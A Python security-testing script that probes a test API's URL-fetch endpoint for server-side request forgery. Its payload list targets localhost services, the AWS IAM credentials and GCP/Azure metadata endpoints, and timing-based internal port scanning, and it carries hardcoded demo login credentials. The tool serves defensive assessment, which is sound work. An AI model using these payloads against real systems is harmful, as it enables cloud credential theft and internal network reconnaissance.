#!/usr/bin/env python3
"""
ssrf_tester.py — Server-Side Request Forgery DAST Module
==========================================================
Tests the FinSecure API's /api/fetch?url= endpoint for SSRF:
  1. Direct SSRF — internal service probing (localhost, internal IPs)
  2. Cloud metadata SSRF — AWS/GCP metadata endpoints
  3. Blind SSRF — response time difference detection

Usage:
    python assessment/dast/ssrf_tester.py --target http://localhost:8080
"""

import argparse
import json
import os
import time
from datetime import datetime
from pathlib import Path

import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()
FINDINGS_FILE = "findings/dast_results.json"
FINDINGS: list[dict] = []

SSRF_TARGETS = [
    # Internal services — should be blocked
    ("localhost API",        "http://localhost:8080/actuator/env",       "INTERNAL", "HIGH"),
    ("localhost H2 Console", "http://localhost:8080/h2-console",          "INTERNAL", "HIGH"),
    ("127.0.0.1 SSH",        "http://127.0.0.1:22",                       "INTERNAL", "HIGH"),
    ("127.0.0.1 Redis",      "http://127.0.0.1:6379",                     "INTERNAL", "HIGH"),
    ("0.0.0.0",              "http://0.0.0.0:8080",                       "INTERNAL", "HIGH"),
    # Cloud metadata — critical if deployed on AWS/GCP/Azure
    ("AWS Metadata",         "http://169.254.169.254/latest/meta-data/",  "CLOUD",    "CRITICAL"),
    ("AWS IAM Creds",        "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "CLOUD", "CRITICAL"),
    ("GCP Metadata",         "http://metadata.google.internal/computeMetadata/v1/", "CLOUD", "CRITICAL"),
    ("Azure Metadata",       "http://169.254.169.254/metadata/instance",  "CLOUD",    "CRITICAL"),
    # External baseline (should work — proves endpoint is functional)
    ("External (httpbin)",   "http://httpbin.org/get",                    "EXTERNAL", "INFO"),
]


def get_auth_token(target: str) -> str | None:
    try:
        r = requests.post(f"{target}/api/auth/login",
                          json={"username": "alice", "password": "alice123"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except Exception:
        pass
    return None


def add_finding(title: str, severity: str, description: str, evidence: str, poc: list[str]) -> None:
    FINDINGS.append({
        "tool": "ssrf_tester", "title": title, "severity": severity,
        "description": description, "evidence": evidence, "poc_steps": poc,
        "timestamp": datetime.utcnow().isoformat() + "Z",
    })


# ─── Test 1 & 2: Direct + Cloud SSRF ─────────────────────────────────────────

def test_ssrf_targets(target: str, token: str) -> None:
    console.print(Panel(
        "[bold cyan]TEST 1 & 2: Direct SSRF — Internal + Cloud Metadata[/bold cyan]",
        border_style="cyan",
    ))

    headers = {"Authorization": f"Bearer {token}"}

    table = Table(box=box.ROUNDED, header_style="bold cyan", border_style="blue", show_lines=True)
    table.add_column("Label",       width=22)
    table.add_column("SSRF URL",    width=55)
    table.add_column("HTTP",        width=8)
    table.add_column("Type",        width=10)
    table.add_column("Result",      width=25)

    TYPE_COLORS = {"INTERNAL": "yellow", "CLOUD": "red", "EXTERNAL": "green"}

    for label, ssrf_url, ssrf_type, severity in SSRF_TARGETS:
        color = TYPE_COLORS.get(ssrf_type, "white")
        try:
            start = time.time()
            r = requests.get(
                f"{target}/api/fetch",
                params={"url": ssrf_url},
                headers=headers,
                timeout=8,
            )
            elapsed = time.time() - start
            code = r.status_code

            try:
                resp_data = r.json()
                has_body   = bool(resp_data.get("body", ""))
                body_size  = len(resp_data.get("body", ""))
                inner_code = resp_data.get("status", 0)
                error_msg  = resp_data.get("error", "")
            except Exception:
                has_body   = False
                body_size  = 0
                inner_code = 0
                error_msg  = ""

            # Detect SSRF: server fetched the URL (got a body back, or got an inner response)
            ssrf_confirmed = (
                (code == 200 and has_body and ssrf_type in ("INTERNAL", "CLOUD")) or
                (inner_code > 0 and ssrf_type in ("INTERNAL", "CLOUD"))
            )

            # Blind SSRF via timing: connection refused is fast; reachable hosts take longer
            blind_ssrf = (ssrf_type == "INTERNAL" and elapsed > 2.0 and not error_msg)

            if ssrf_confirmed or blind_ssrf:
                result = f"[bold red]✗ SSRF CONFIRMED[/bold red]"
                sev_label = "[red]" + severity + "[/red]"

                add_finding(
                    title=f"SSRF via /api/fetch — {label}",
                    severity=severity,
                    description=(
                        f"The /api/fetch endpoint fetched internal/cloud URL: {ssrf_url}. "
                        "This allows attackers to: probe internal services, read cloud metadata "
                        "(IAM credentials, tokens), and pivot to internal network."
                    ),
                    evidence=(
                        f"GET /api/fetch?url={ssrf_url} → HTTP {code}, "
                        f"body_size={body_size}B, inner_status={inner_code}, time={elapsed:.2f}s"
                    ),
                    poc=[
                        f"GET {target}/api/fetch?url=http://169.254.169.254/latest/meta-data/",
                        "Returns: AWS IAM role, instance ID, security credentials",
                        f"GET {target}/api/fetch?url=http://localhost:8080/actuator/env",
                        "Returns: all Spring environment variables including secrets",
                    ],
                )
            elif code == 500 and error_msg:
                # 500 with error = server tried to connect (blind SSRF indicator)
                is_connection_error = any(k in error_msg.lower() for k in
                                          ["refused", "timeout", "connect", "failed"])
                if is_connection_error and ssrf_type == "INTERNAL":
                    result = "[yellow]⚠ Blind SSRF (connection error leaked)[/yellow]"
                    add_finding(
                        title=f"Blind SSRF — {label}",
                        severity="MEDIUM",
                        description="Server attempted to connect — connection error message leaked reveals internal network topology.",
                        evidence=f"Error message: {error_msg[:150]}",
                        poc=[f"GET {target}/api/fetch?url=http://127.0.0.1:6379",
                             "Response error: 'Connection refused to 127.0.0.1:6379'",
                             "Confirms Redis port is closed — port scanning via error timing"],
                    )
                else:
                    result = "[dim]500 (blocked/filtered)[/dim]"
            else:
                result = "[green]✓ Blocked[/green]"

            table.add_row(
                label,
                ssrf_url[:53],
                str(code),
                f"[{color}]{ssrf_type}[/{color}]",
                result,
            )

        except requests.exceptions.ConnectionError:
            table.add_row(label, ssrf_url[:53], "N/A", ssrf_type, "[dim]API offline[/dim]")

    console.print(table)


# ─── Test 3: Blind SSRF via Timing ────────────────────────────────────────────

def test_blind_ssrf_timing(target: str, token: str) -> None:
    console.print(Panel("[bold cyan]TEST 3: Blind SSRF — Response Time Analysis[/bold cyan]",
                        border_style="cyan"))

    headers = {"Authorization": f"Bearer {token}"}

    # Known-closed vs known-open ports — timing difference reveals SSRF
    timing_tests = [
        ("Closed port 9999",     "http://127.0.0.1:9999"),
        ("Potentially open 8080","http://127.0.0.1:8080"),
        ("Potentially open 3306","http://127.0.0.1:3306"),  # MySQL
        ("Potentially open 5432","http://127.0.0.1:5432"),  # Postgres
    ]

    table = Table(box=box.SIMPLE, header_style="bold")
    table.add_column("Target",      width=30)
    table.add_column("Time (s)",    width=12, justify="right")
    table.add_column("Inference",   width=35)

    for label, url in timing_tests:
        try:
            start = time.time()
            requests.get(f"{target}/api/fetch", params={"url": url},
                         headers=headers, timeout=8)
            elapsed = time.time() - start

            if elapsed > 3.0:
                inference = "[yellow]⚠ Port may be OPEN (slow response)[/yellow]"
            elif elapsed < 0.5:
                inference = "[dim]Port likely CLOSED (fast timeout)[/dim]"
            else:
                inference = f"[dim]Inconclusive ({elapsed:.2f}s)[/dim]"

            table.add_row(label, f"{elapsed:.2f}", inference)

        except requests.exceptions.ConnectionError:
            table.add_row(label, "N/A", "[dim]API offline[/dim]")

    console.print(table)
    console.print("[dim]Note: Significant timing differences between ports confirm SSRF port-scan capability.[/dim]")


# ─── Save & Main ──────────────────────────────────────────────────────────────

def save_findings() -> None:
    os.makedirs("findings", exist_ok=True)
    existing = []
    if Path(FINDINGS_FILE).exists():
        with open(FINDINGS_FILE) as f:
            try:
                existing = json.load(f).get("findings", [])
            except Exception:
                pass
    with open(FINDINGS_FILE, "w") as f:
        json.dump({"last_updated": datetime.utcnow().isoformat() + "Z",
                   "findings": existing + FINDINGS}, f, indent=2)
    console.print(f"\n[green]✓ Findings saved to[/green] [bold]{FINDINGS_FILE}[/bold]")


def main():
    parser = argparse.ArgumentParser(description="FinSecure SSRF Tester")
    parser.add_argument("--target", default="http://localhost:8080")
    args = parser.parse_args()

    console.print(Panel(
        "[bold cyan]FinSecure API — SSRF Vulnerability Tester[/bold cyan]\n"
        "[dim]Internal SSRF · Cloud Metadata · Blind SSRF Timing[/dim]",
        border_style="cyan",
    ))
    console.print(f"[dim]Target:[/dim] [bold]{args.target}[/bold]\n")

    token = get_auth_token(args.target)
    if not token:
        console.print("[yellow]⚠  Using demo token (API may be offline)[/yellow]\n")
        token = "DEMO"

    test_ssrf_targets(args.target, token)
    console.print()
    test_blind_ssrf_timing(args.target, token)
    save_findings()

    console.print(f"\n[{'bold red' if FINDINGS else 'bold green'}]"
                  f"{'⚠  ' + str(len(FINDINGS)) + ' SSRF findings!' if FINDINGS else '✓ No SSRF detected'}[/"
                  f"{'bold red' if FINDINGS else 'bold green'}]")


if __name__ == "__main__":
    main()
